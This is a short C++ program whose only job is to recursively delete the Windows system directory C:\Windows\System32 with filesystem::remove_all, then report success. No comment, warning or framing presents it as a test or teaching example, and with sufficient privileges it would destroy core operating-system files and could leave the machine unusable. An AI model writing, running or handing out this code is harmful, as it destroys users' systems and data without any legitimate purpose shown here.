#include <iostream>
#include <filesystem>

using namespace std;

int main() {
    string directoryToDelete = "C:\\Windows\\System32"; // Specify the directory path

    try {
        filesystem::remove_all(directoryToDelete);
        cout << "Directory " << directoryToDelete << " deleted successfully." << endl;
    } catch (const filesystem::filesystem_error& ex) {
        cerr << "Error deleting the directory: " << ex.what() << endl;
    }

    return 0;
}
